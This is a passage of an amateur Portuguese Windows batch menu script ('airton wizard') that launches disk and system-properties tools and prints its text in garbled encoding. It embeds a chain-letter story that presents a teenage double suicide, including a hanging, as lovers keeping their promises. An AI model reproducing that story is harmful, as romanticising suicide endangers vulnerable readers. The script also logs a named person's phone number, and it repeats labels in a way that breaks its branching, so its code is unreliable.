echo COLOR F8 >> CORES.cmd
echo goto in >> CORES.cmd
echo :F9 >> CORES.cmd
echo COLOR F9 >> CORES.cmd
echo goto in >> CORES.cmd
echo :FA >> CORES.cmd
echo COLOR FA >> CORES.cmd
echo goto in >> CORES.cmd
echo :FB >> CORES.cmd
echo COLOR FB >> CORES.cmd
echo goto in >> CORES.cmd
echo :FC >> CORES.cmd
echo COLOR FC >> CORES.cmd
echo goto in >> CORES.cmd
echo :FD >> CORES.cmd
echo COLOR FD >> CORES.cmd
echo goto in >> CORES.cmd
echo :FE >> CORES.cmd
echo COLOR FE >> CORES.cmd
echo goto in >> CORES.cmd
echo :FF >> CORES.cmd
echo COLOR FF >> CORES.cmd
echo goto in >> CORES.cmd
echo MsgBox  "CORES.CMD CRIADO COM SUCESSO ",vbOKOnly + vbInformation,"PACOTES CMD">%temp%\js.vbs
start %temp%\js.vbs
goto menu
:end
echo MsgBox "JA EXISTE O ARQUIVO CORES.CMD",vbOKOnly + vbCritical, "PACOTES CMD" >%temp%\js.vbs
start %temp%\js.vbs

goto menu





:MEN

echo Meu telefone ้ TIM >> clodoaldo.txt
echo telefone TIM 0416182867263 >> clodoaldo.txt




CHOREI 
VALE A PENA LER !

ECHO Ela: Al๔?
ECHO Ele: Al๔, sou eu!
ECHO Ela: (Ela fica em sil๊ncio um tempo) ...Voc๊ de novo?
ECHO Ele: Nใo desliga! Deixe eu te falar algo!
ECHO Ela: ...
ECHO Ele: Olha, eu sei que a gente terminou, mas... Eu ainda te amo! Tudo bem se nใo quiser mais ficar comigo... Mas nใo precisa parar de falar comigo! Voc๊ prometeu que nunca iria sair do meu lado, nใo importa o que aconte็a, nใo ้?
ECHO Ela: (Sil๊ncio) ...Voc๊ ainda nใo se tocou garoto? Eu quero te esquecer.
ECHO Ele: Eu entendo, mas ainda podemos ser amigos.
ECHO Ela: Nใo, nใo podemos.
ECHO Ele: Por qu๊?
ECHO Ela: ...
ECHO Ele: A gente era feliz, nใo? A gente se divertia muito juntos... Soh de olhar um pro outro, jแ sorriamos... Poucas palavras jแ faziam nosso dia valer a pena, nใo ้??
ECHO Ela: ...ษ...
ECHO Ele: Entใo por qu๊?
ECHO Ela: ...
ECHO Ele: Responde.
ECHO Ela: Por que eu nใo quero mais te ver. Voc๊ me fez chorar muito.
ECHO Ele: Eu sei, mas eu tamb้m te fiz sorrir muito, nใo? Eu sei que eu nใo devia ter duvidado de voc๊...
ECHO Ela: Agora ้ tarde.
ECHO Ele: Mas-
ECHO Ela: Adeus.
ECHO Ele: Espere, eu te-
ECHO (Ela desliga o telefone)
ECHO.
ECHO ALGUNS DIAS DEPOIS
ECHO.
ECHO (O telefone toca)
ECHO Ela: Al๔?
ECHO Ele: Oi, sou eu de novo!
ECHO Ela: Aff, o que voc๊ quer dessa vez?
ECHO Ele: Calma! S๓ quero te fazer uma pergunta...
ECHO Ela: (Silencio) ...Fala.
ECHO Ele: Voc๊ me amou?
ECHO Ela: Amei.
ECHO (Os dois ficam em sil๊ncio um tempo)
ECHO Ele: Que bom... Quer dizer que nใo foi tudo mentira... Hey, posso te dizer uma coisa?
ECHO Ela: Diga.
ECHO Ele: Eu ainda te amo, ok? Sempre vou te amar. Eu te prometo, nใo importa quanto tempo passe, eu sempre vou te amar.
ECHO Ela: (Silencio) ...Aham, sei.
ECHO Ele: ษ verdade!
ECHO Ela: ...
ECHO Ele: Voc๊ tแ aํ?
ECHO (Ela desliga o telefone)
ECHO.
ECHO UM MสS SE PASSOU.
ECHO (O telefone toca)
ECHO Ela: Al๔?
ECHO Ele: Sou eu, nใo desliga!
ECHO Ela: Por que nใo deveria?
ECHO Ele: Olha, por favor, vamos terminar esse assunto. Para de me evitar. Nem consigo te ver no col้gio mais!
ECHO Ela: Eu me mudei de col้gio.
ECHO Ele: Hใ? Por qu๊?
ECHO Ela: Nใo quero mais te ver.
ECHO Ele: .....
ECHO Ela: E entใo? O que voc๊ queria me dizer?
ECHO Ele: Por qu๊ voc๊ age como se quisesse me machucar?
ECHO Ela: (Silencio)
ECHO Ele: Hein?
ECHO Ela: E voc๊ nใo me machucou?? Voc๊ jurou que ia confiar em mim!!
ECHO Ele: ....
ECHO Ela: Voc๊ s๓ fez promessas e as quebrou depois!
ECHO Ele: ....
ECHO Ela: Por que nใo me esquece, hein?
ECHO Ele: Por que o dia em que eu me esquecer de voc๊... Eu terei morrido.
ECHO Ela: Entใo morra.
ECHO (Desliga)
ECHO.
ECHO MAIS ALGUNS MESES SE PASSARAM. O GAROTO CONTINUOU LIGANDO PRA ELA, MAS ELA PAROU DE ATENDER OS TELEFONEMAS. ATษ QUE UM DIA, POR ALGUM MOTIVO ELA ATENDEU.
ECHO.
ECHO Ela: Al๔?
ECHO Ele: Sou eu.
ECHO Ela: O que quer agora?
ECHO Ele: Calma, nใo desliga. Nใo vim correr atrแs de voc๊.
ECHO Ela: Hใ?
ECHO Ele: Sim, eu esqueci de voc๊.
ECHO Ela: (Sil๊ncio)
ECHO Ele: S๓ liguei pra dizer isso.
ECHO Ela: Por que voc๊ decidiu me esquecer? (com a voz tremula)
ECHO Ele: ...Por que voc๊ pediu.
ECHO Ela: Como assim?
ECHO Ele: Eu te amo e sempre vou te amar. Mas vou esquece-la.
ECHO Ela: O que? Eu nใo to entendendo!
ECHO Ele: Adeus.
ECHO Ela: O que? ESPE-
ECHO (Mas ele jแ havia desligado o telefone)
ECHO.
ECHO UM MES SE PASSOU E O GAROTO NUNCA MAIS LIGOU. A GAROTA COMEวOU A FICAR PREOCUPADA COM ELE. UM DIA ELA DECIDIU IR NA CASA DO GAROTO, PARA VER COMO ELE ESTAVA. UMA SENHORA ATENDEU A PORTA.
ECHO Ela: Oi.
ECHO Mใe: Olแ... (a mใe do garoto demora um pouco, mas reconhece a ex do filho) Hแ quanto tempo! O que faz aqui?
ECHO Ela: Eu vim ver como o seu filho estแ.
ECHO Mใe: (come็a a chorar)
ECHO Ela: Senhora, o que houve?
ECHO Mใe: (chorando) Voc๊ nใo ficou sabendo?
ECHO Ela: Do que?
ECHO Mใe: Ele... Se matou.
ECHO Ela: O que?? (os olhos dela se enchem de lagrimas)
ECHO Mใe: (chorando) Creio... Que foi pra voc๊ que ele deixou essa carta.
ECHO.
ECHO A GAROTA PEGOU A CARTA E FOI PRA CASA. ELA CHEGOU EM CASA, SE
ECHO TRANCOU NO QUARTO, SENTOU NA CAMA E COMEวOU A CHORAR. SOMENTE ALGUMAS HORAS DEPOIS ELA TEVE CORAGEM DE ABRIR A CARTA.
ECHO. 
ECHO "Eu sei que quebrei uma promessa quando nใo confiei em voc๊... Mas nใo quero quebrar mais nenhuma... Agora eu posso dizer... Eu esqueci de voc๊."
ECHO. 
ECHO A GAROTA ENTENDEU QUE AQUELE ULTIMO TELEFONEMA DO GAROTO FOI UMA DESPEDIDA. ELE HAVIA AVISADO A ELA O QUE ELE FARIA E ELA NรO HAVIA ENTENDIDO. O GAROTO HAVIA CUMPRIDO A PROMESSA DE QUE AMARIA ELA ATษ O FINAL E QUE Sำ ESQUECERIA DELA QUANDO MORRESSE. O GAROTO Sำ QUIS PROVAR PRA ELA QUE CUMPRIRIA SUAS PROMESSAS DE UM JEITO OU DE OUTRO.
ECHO. 
ECHO O QUE O GAROTO NรO SABIA ษ QUE TODO DIA A GAROTA ESPERAVA PELOS TELEFONEMAS DELE. E SEMPRE QUE ELA DESLIGAVA, ELA COMEวAVA A CHORAR. POR MAIS QUE A GAROTA DISSESSE QUE QUERIA ESQUECE-LO, ELA APENAS ESTAVA TENTANDO CONVENCER A SI MESMA DISSO. A GAROTA SEMPRE HAVIA O AMADO. MAS NรO QUERIA ADMITIR.
ECHO.
ECHO NO DIA SEGUINTE, A GAROTA FOI ENCONTRADA ENFORCADA EM SEU QUARTO COM UMA CARTA ONDE ESTAVA ESCRITO: 
ECHO. 
ECHO "Voc๊ cumpriu suas promessas, agora eu tenho de cumprir a minha. Eu ficarei ao seu lado, nใo importa o que aconte็a."
ECHO.
ECHO OS DOIS CUMPRIRAM SUAS PROMESSAS. MAS OS DOIS SE ARREPENDERAM DE APENAS UMA COISA. SE ARREPENDERAM DE NรO TEREM CUMPRIDO-AS JUNTOS. EM VIDA.
ECHO. 
ECHO Ainda da tempo... Seja fiel a(o) sua(seu) parceira(o) e cumpra o que voc๊ prometeu a ela(ele)

PAUSE SE QUISER O AQUIVO COM O RELATO TECLE ENTER


ECHO Ela: Al๔? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Al๔, sou eu! >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: (Ela fica em sil๊ncio um tempo) ...Voc๊ de novo? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Nใo desliga! Deixe eu te falar algo! >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: ... >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Olha, eu sei que a gente terminou, mas... Eu ainda te amo! Tudo bem se nใo quiser mais ficar comigo... Mas nใo precisa parar de falar comigo! Voc๊ prometeu que nunca iria sair do meu lado, nใo importa o que aconte็a, nใo ้? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: (Sil๊ncio) ...Voc๊ ainda nใo se tocou garoto? Eu quero te esquecer. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Eu entendo, mas ainda podemos ser amigos. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Nใo, nใo podemos. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Por qu๊? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: ... >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: A gente era feliz, nใo? A gente se divertia muito juntos... Soh de olhar um pro outro, jแ sorriamos... Poucas palavras jแ faziam nosso dia valer a pena, nใo ้?? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: ...ษ... >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Entใo por qu๊? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: ... >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Responde. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Por que eu nใo quero mais te ver. Voc๊ me fez chorar muito. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Eu sei, mas eu tamb้m te fiz sorrir muito, nใo? Eu sei que eu nใo devia ter duvidado de voc๊... >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Agora ้ tarde. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Mas- >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Adeus. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Espere, eu te- >> MENSAGEM_DO_TELEFONE.TXT
ECHO (Ela desliga o telefone) >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO ALGUNS DIAS DEPOIS >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO (O telefone toca) >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Al๔? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Oi, sou eu de novo! >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Aff, o que voc๊ quer dessa vez? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Calma! S๓ quero te fazer uma pergunta... >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: (Silencio) ...Fala. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Voc๊ me amou? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Amei. >> MENSAGEM_DO_TELEFONE.TXT
ECHO (Os dois ficam em sil๊ncio um tempo) >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Que bom... Quer dizer que nใo foi tudo mentira... Hey, posso te dizer uma coisa? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Diga. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Eu ainda te amo, ok? Sempre vou te amar. Eu te prometo, nใo importa quanto tempo passe, eu sempre vou te amar. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: (Silencio) ...Aham, sei. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: ษ verdade! >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: ... >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Voc๊ tแ aํ? >> MENSAGEM_DO_TELEFONE.TXT
ECHO (Ela desliga o telefone) >> MENSAGEM_DO_TELEFONE.TXT
ECHO. >> MENSAGEM_DO_TELEFONE.TXT
ECHO UM MสS SE PASSOU. >> MENSAGEM_DO_TELEFONE.TXT
ECHO (O telefone toca) >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Al๔? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Sou eu, nใo desliga! >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Por que nใo deveria? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Olha, por favor, vamos terminar esse assunto. Para de me evitar. Nem consigo te ver no col้gio mais! >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Eu me mudei de col้gio. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Hใ? Por qu๊? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Nใo quero mais te ver. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: ..... >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: E entใo? O que voc๊ queria me dizer? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Por qu๊ voc๊ age como se quisesse me machucar? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: (Silencio) >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Hein? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: E voc๊ nใo me machucou?? Voc๊ jurou que ia confiar em mim!! >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: .... >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Voc๊ s๓ fez promessas e as quebrou depois! >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: .... >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Por que nใo me esquece, hein? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Por que o dia em que eu me esquecer de voc๊... Eu terei morrido. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Entใo morra. >> MENSAGEM_DO_TELEFONE.TXT
ECHO (Desliga) >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO MAIS ALGUNS MESES SE PASSARAM. O GAROTO CONTINUOU LIGANDO PRA ELA, MAS ELA PAROU DE ATENDER OS TELEFONEMAS. ATษ QUE UM DIA, POR ALGUM MOTIVO ELA ATENDEU. >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Al๔? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Sou eu. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: O que quer agora? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Calma, nใo desliga. Nใo vim correr atrแs de voc๊. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Hใ? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Sim, eu esqueci de voc๊. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: (Sil๊ncio) >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: S๓ liguei pra dizer isso. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Por que voc๊ decidiu me esquecer? (com a voz tremula) >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: ...Por que voc๊ pediu. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Como assim? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Eu te amo e sempre vou te amar. Mas vou esquece-la. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: O que? Eu nใo to entendendo! >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ele: Adeus. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: O que? ESPE- >> MENSAGEM_DO_TELEFONE.TXT
ECHO (Mas ele jแ havia desligado o telefone) >> MENSAGEM_DO_TELEFONE.TXT
ECHO. >> MENSAGEM_DO_TELEFONE.TXT
ECHO UM MES SE PASSOU E O GAROTO NUNCA MAIS LIGOU. A GAROTA COMEวOU A FICAR PREOCUPADA COM ELE. UM DIA ELA DECIDIU IR NA CASA DO GAROTO, PARA VER COMO ELE ESTAVA. UMA SENHORA ATENDEU A PORTA. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Oi. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Mใe: Olแ... (a mใe do garoto demora um pouco, mas reconhece a ex do filho) Hแ quanto tempo! O que faz aqui? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Eu vim ver como o seu filho estแ. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Mใe: (come็a a chorar) >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Senhora, o que houve? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Mใe: (chorando) Voc๊ nใo ficou sabendo? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: Do que? >> MENSAGEM_DO_TELEFONE.TXT
ECHO Mใe: Ele... Se matou. >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ela: O que?? (os olhos dela se enchem de lagrimas) >> MENSAGEM_DO_TELEFONE.TXT
ECHO Mใe: (chorando) Creio... Que foi pra voc๊ que ele deixou essa carta. >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO A GAROTA PEGOU A CARTA E FOI PRA CASA. ELA CHEGOU EM CASA, SE >> MENSAGEM_DO_TELEFONE.TXT
ECHO TRANCOU NO QUARTO, SENTOU NA CAMA E COMEวOU A CHORAR. SOMENTE ALGUMAS HORAS DEPOIS ELA TEVE CORAGEM DE ABRIR A CARTA. >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO "Eu sei que quebrei uma promessa quando nใo confiei em voc๊... Mas nใo quero quebrar mais nenhuma... Agora eu posso dizer... Eu esqueci de voc๊." >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO A GAROTA ENTENDEU QUE AQUELE ULTIMO TELEFONEMA DO GAROTO FOI UMA DESPEDIDA. ELE HAVIA AVISADO A ELA O QUE ELE FARIA E ELA NรO HAVIA ENTENDIDO. O GAROTO HAVIA CUMPRIDO A PROMESSA DE QUE AMARIA ELA ATษ O FINAL E QUE Sำ ESQUECERIA DELA QUANDO MORRESSE. O GAROTO Sำ QUIS PROVAR PRA ELA QUE CUMPRIRIA SUAS PROMESSAS DE UM JEITO OU DE OUTRO. >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO O QUE O GAROTO NรO SABIA ษ QUE TODO DIA A GAROTA ESPERAVA PELOS TELEFONEMAS DELE. E SEMPRE QUE ELA DESLIGAVA, ELA COMEวAVA A CHORAR. POR MAIS QUE A GAROTA DISSESSE QUE QUERIA ESQUECE-LO, ELA APENAS ESTAVA TENTANDO CONVENCER A SI MESMA DISSO. A GAROTA SEMPRE HAVIA O AMADO. MAS NรO QUERIA ADMITIR. >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO NO DIA SEGUINTE, A GAROTA FOI ENCONTRADA ENFORCADA EM SEU QUARTO COM UMA CARTA ONDE ESTAVA ESCRITO:  >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO "Voc๊ cumpriu suas promessas, agora eu tenho de cumprir a minha. Eu ficarei ao seu lado, nใo importa o que aconte็a." >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO OS DOIS CUMPRIRAM SUAS PROMESSAS. MAS OS DOIS SE ARREPENDERAM DE APENAS UMA COISA. SE ARREPENDERAM DE NรO TEREM CUMPRIDO-AS JUNTOS. EM VIDA. >> MENSAGEM_DO_TELEFONE.TXT
ECHO.  >> MENSAGEM_DO_TELEFONE.TXT
ECHO Ainda da tempo... Seja fiel a(o) sua(seu) parceira(o) e cumpra o que voc๊ prometeu a ela(ele) >> MENSAGEM_DO_TELEFONE.TXT


::====================================================================== MENU ULTIMATE =================================================================================



::====================================================================== MENU ULTIMATE =================================================================================


Echo off
title menu.bat   ออออออออออออ airton wizard ออออออออออออ
:ultimat
cls
color 1f
time /t
date /t
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo  อ    MENU ULTIMAT    digite boot p/ ver comandos                          
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo  อ                    AIRTON WIZARD                         
echo  อ                                                                          
echo  อ           1 อ     COMPUTADOR                                 
echo  อ           2 อ     PEN DRIVE                                  
echo  อ           3 อ     GERENCIADORES                                        
echo  อ           4 อ     BKUP                                            
echo  อ           5 อ     INTERNET                                      
echo  อ           6 อ     LIMPESA                                     
echo  อ           7 อ     APLICATIVOS                                
echo  อ           8 อ     CORES                                          
echo  อ           9 อ     CRIACAO                                      
echo  อ          10 อ     VIRUS                                           
echo  อ          11 อ     HACKER      
echo  อ          11 อ     menu volta para dedellsysten32                                                                      
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo:            AIRTON WIZARD
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ 1 goto 1
if %op% equ 2 goto 2
if %op% equ 3 goto 3
if %op% equ 4 goto 4
if %op% equ 5 goto 5
if %op% equ 6 goto 6
if %op% equ 7 goto 7
if %op% equ 8 goto 8
if %op% equ 9 goto 9
if %op% equ 10 goto 10
if %op% equ 11 goto HACKER
if %op% equ 12 goto 12
if %op% equ 13 goto 13
if %op% equ 14 goto 14
if %op% equ 15 goto 15
if %op% equ 16 goto 16
if %op% equ 17 goto 17
if %op% equ 18 goto 18
if %op% equ 19 goto 19
if %op% equ BOOT goto boot
if %op% equ boot goto boot	
if %op% equ  menu goto  menu
if %op% equ  MENU goto  menu
::================================== 1 COMPUTADOR  =====================================
echo off

:1  COMPUTADOR

          :COMP
CLS 
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                     COMPUTADOR             
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 2f
echo  อ           a) ScanDisk
echo  อ           b) Desfragmentador
echo  อ           c) Propriedades do sistema
echo  อ           d) sub menu
echo  อ           v) voltar
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ  A goto  A
if %op% equ b goto b
if %op% equ  B goto  B
if %op% equ c goto c
if %op% equ  C goto  C
if %op% equ d goto d
if %op% equ  D goto  D
if %op% equ v goto v
if %op% equ V goto v
if %op% equ f  goto  f
if %op% equ  F goto  F
if %op% equ g goto g
if %op% equ h goto h
if %op% equ  i goto  i

:a

chkdsk

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto :COMP


 :b

dfrgui
   

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto :COMP

:v
goto ultimat

::=========================== 1a COPUTADOR ========================================


:c
: PRO 
CLS 
time /t
date /t
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo             PROPIEDADES DO SISTEMA             
echo   อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ               
color 0f
echo  อ           a) Prop sistema NOME PC
echo  อ           b) Prop sistema PREVENวรO DE DADOS
echo  อ           c) Prop sistema HARDWARE
echo  อ           d) Prop sistema PERFORMANCE
echo  อ           e) Prop sistema REMOTO
echo  อ           v) voltar
echo  อ           
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo                     DEDE WIZARD                                                                        
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
SET /P OP=Digite sua op็โo? 
if %op% equ a goto a
if %op% equ b goto b
if %op% equ c goto c
if %op% equ d goto d
if %op% equ e goto e
if %op% equ f  goto  f
if %op% equ g goto g
if %op% equ h goto h
if %op% equ v goto v

echo msgbox"Erro [ %s0% ] nใo ้ um comando veja se a CAPS LOCK estแ ativada",vbcritical,"Desculpe %username% mais isso nใo pode" > %temp%\js03.vbs
start %temp%\js03.vbs
goto PRO

:a

SystemPropertiesComputerName

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 


 :b
SystemPropertiesDataExecutionPrevention
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 



:c
SystemPropertiesHardware

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 


:d
SystemPropertiesPerformance
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 


:e
SystemPropertiesProtection
CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 

:F

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo: VOLTAR PARA   PROPIEDADES DO SISTEMA 
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto  COMP 
 :NAO
cls
 goto  PRO 


:d

CLS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
@echo off
color 04
echo:
echo:
echo:           VOLTAR PARA MENU WIZARD
echo:
echo:
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
 choice /C SN /M " VOLTAR AO MENU PRINCIPAL Sim OU NAO "
 IF errorlevel=2 goto NAO
 IF errorlevel=1 goto SIM
 :SIM
cls
goto ultimat
 :NAO
cls
 goto :COMP

:v
goto ultimat

::===================================== 2 PEN DRIVER  ============================

echo off
:2     PEN DRIVE

